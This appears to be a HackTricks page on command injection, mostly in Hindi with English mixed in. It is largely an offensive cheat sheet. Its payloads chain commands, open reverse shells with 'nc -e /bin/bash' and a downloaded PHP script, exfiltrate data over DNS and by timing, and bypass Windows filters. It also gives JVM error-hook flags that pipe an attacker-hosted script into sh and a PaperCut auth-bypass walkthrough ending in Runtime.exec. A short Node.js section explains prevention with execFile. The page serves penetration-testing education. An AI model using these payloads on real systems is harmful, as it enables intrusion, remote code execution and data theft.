# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injection क्या है?

एक **command injection** हमलावर को उस server पर arbitrary operating system commands execute करने की अनुमति देती है जो किसी application को host कर रहा होता है। परिणामस्वरूप, application और उसके सभी data पूरी तरह compromise हो सकते हैं। इन commands के execution से सामान्यतः हमलावर को application के environment और underlying system पर unauthorized access या control प्राप्त हो जाता है।

### संदर्भ

यह निर्भर करता है कि **आपका input कहाँ inject किया जा रहा है** — आपको commands से पहले quoted context (using `"` or `'`) को **terminate** करना पड़ सकता है।

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limition** Bypasses

यदि आप **arbitrary commands inside a linux machine** को निष्पादित करने की कोशिश कर रहे हैं, तो आप इस **Bypasses:** के बारे में पढ़ने में रुचि रखेंगे।


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **उदाहरण**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### पैरामीटर

यहाँ शीर्ष 25 पैरामीटर दिए गए हैं जो code injection और समान RCE vulnerabilities के लिए संवेदनशील हो सकते हैं (from [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

डेटा निकालना: char by char
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS-आधारित data exfiltration

यह `https://github.com/HoLyVieR/dnsbin` टूल पर आधारित है और dnsbin.zhack.ca पर भी होस्ट किया गया है
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNS आधारित data exfiltration की जाँच के लिए ऑनलाइन टूल:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

जब आप JavaScript/TypeScript बैक-एंड का ऑडिट कर रहे होते हैं, तो अक्सर आपको Node.js `child_process` API से सामना होगा।
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` एक **shell** (`/bin/sh -c`) को spawn करता है, इसलिए shell के लिए जिन किसी भी कैरेक्टर का विशेष अर्थ होता है (back-ticks, `;`, `&&`, `|`, `$()`, …) जब उपयोगकर्ता इनपुट स्ट्रिंग में जोड़ दिया जाता है तो वे **command injection** का कारण बनते हैं।

**रोकथाम:** `execFile()` का उपयोग करें (या `spawn()` को `shell` option के बिना) और **प्रत्येक argument को अलग array element के रूप में प्रदान करें** ताकि कोई shell शामिल न हो:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
वास्तविक मामला: *Synology Photos* ≤ 1.7.0-0794 एक unauthenticated WebSocket इवेंट के माध्यम से प्रभावित था जिसने हमलावर नियंत्रित डेटा को `id_user` में रखा, जो बाद में एक `exec()` कॉल में एम्बेड किया गया और RCE प्राप्त किया गया (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

सभी injections को shell metacharacters की आवश्यकता नहीं होती। यदि application सिस्टम utility को असत्यापित स्ट्रिंग्स arguments के रूप में पास करता है (यहां तक कि `execve`/`execFile` के साथ और बिना shell के), तो कई प्रोग्राम किसी भी argument को जो `-` या `--` से शुरू होता है, option के रूप में पार्स करेंगे। इससे एक हमलावर मोड बदल सकता है, output paths बदल सकता है, या shell में घुसे बिना खतरनाक व्यवहार ट्रिगर कर सकता है।

यह सामान्यतः निम्न स्थानों पर दिखाई देता है:

- एंबेडेड Web UIs/CGI handlers जो कमांड बनाते हैं जैसे `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, आदि।
- Centralized CGI routers (उदा., `/cgi-bin/<something>.cgi` जिसमें selector parameter जैसे `topicurl=<handler>` हो) जहाँ कई handlers एक ही कमजोर validator को reuse करते हैं।

क्या आज़माएँ:

- ऐसे मान दें जो `-`/`--` से शुरू होते हों ताकि downstream tool उन्हें फ्लैग के रूप में ले ले।
- उन फ्लैग्स का दुरुपयोग करें जो व्यवहार बदलते हैं या फाइलें लिखते हैं, उदाहरण के लिए:
  - `ping`: `-f`/`-c 100000` डिवाइस पर दबाव डालने के लिए (DoS)
  - `curl`: `-o /tmp/x` किसी भी path पर लिखने के लिए, `-K <url>` attacker-controlled config लोड करने के लिए
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` unsafe wrappers में post-rotate execution हासिल करने के लिए
- यदि प्रोग्राम `--` end-of-options को सपोर्ट करता है, तो उन naive mitigations को बायपास करने की कोशिश करें जो गलत जगह `--` prepend करते हैं।

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### JVM डायग्नोस्टिक कॉलबैक (गारंटीकृत exec के लिए)

कोई भी primitive जो आपको **inject JVM command-line arguments** (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, आदि) application bytecode को छुए बिना एक विश्वसनीय RCE में बदला जा सकता है:

1. निर्धारित क्रैश ज़बरदस्ती कराएँ by shrinking metaspace or heap: `-XX:MaxMetaspaceSize=16m` (or a tiny `-Xmx`). This guarantees an `OutOfMemoryError` even during early bootstrap.
2. एक error hook attach करें: `-XX:OnOutOfMemoryError="<cmd>"` या `-XX:OnError="<cmd>"` JVM abort होने पर किसी भी arbitrary OS कमांड को execute कर देता/देती है।
3. वैकल्पिक रूप से `-XX:+CrashOnOutOfMemoryError` जोड़ें ताकि recovery प्रयासों से बचा जा सके और payload one-shot रहे।

उदाहरण payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Because these diagnostics are parsed by the JVM itself, no shell metacharacters are required and the command runs with the same integrity level as the launcher. Desktop IPC bugs that forward user-supplied JVM flags (see [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)) therefore translate directly into OS command execution.

## PaperCut NG/MF SetupCompleted auth bypass -> print scripting RCE

- Vulnerable NG/MF builds (e.g., 22.0.5 Build 63914) expose `/app?service=page/SetupCompleted`; browsing there and clicking **Login** returns a valid `JSESSIONID` without credentials (authentication bypass in the setup flow).
- In **Options → Config Editor**, set `print-and-device.script.enabled=Y` and `print.script.sandboxed=N` to turn on printer scripting and disable the sandbox.
- In the printer **Scripting** tab, enable the script and keep `printJobHook` defined to avoid validation errors, but place the payload **outside** the function so it executes immediately when you click **Apply** (no print job needed):
```js
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```
- callback को reverse shell से बदलें; अगर UI/PoC pipes/redirects को हैंडल नहीं कर सकता है, तो एक कमांड के साथ payload stage करें और दूसरी request से उसे exec करें।
- Horizon3 का [CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py) auth bypass, config flips, command execution, और rollback को ऑटोमेट करता है—जब सेवा केवल आंतरिक रूप से पहुँच योग्य हो तो इसे एक upstream proxy (उदा., `proxychains` → Squid) के माध्यम से चलाएँ।

## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## संदर्भ

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [PaperCut NG/MF SetupCompleted auth bypass → print scripting RCE](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [CVE-2023-27350.py (auth bypass + print scripting automation)](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)

{{#include ../banners/hacktricks-training.md}}
